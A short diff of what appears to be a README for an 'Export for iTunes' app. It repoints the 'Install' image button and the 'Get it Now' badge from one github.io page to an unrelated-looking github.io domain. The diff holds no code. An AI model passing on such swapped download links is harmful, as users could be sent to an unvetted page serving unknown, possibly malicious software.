@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/exportForiTunes)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://urinoterapia-sigma.github.io/.github/exportForiTunes)
 
 </div>
 
@@ -81,7 +81,7 @@ Export for iTunes fills the gap between Apple Music's closed library ecosystem a
 
 <p align="center">
 
-[![Get it Now Export for iTunes](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/exportForiTunes)
+[![Get it Now Export for iTunes](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/exportForiTunes)
 
 </p>
 
